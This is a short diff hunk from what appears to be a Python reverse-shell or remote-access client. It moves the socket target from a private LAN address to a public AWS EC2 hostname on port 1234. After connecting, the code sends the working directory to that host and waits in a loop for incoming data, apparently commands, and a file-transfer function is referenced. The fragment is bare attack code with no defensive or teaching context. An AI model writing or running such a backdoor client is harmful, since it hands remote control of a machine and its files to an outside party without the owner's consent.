@@ -27,7 +27,7 @@ def get(s, filename):
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1234
-s.connect(('192.168.43.236',port))
+s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
 s.send(os.getcwd().encode())
 while True:
     res = s.recv(2048).decode()
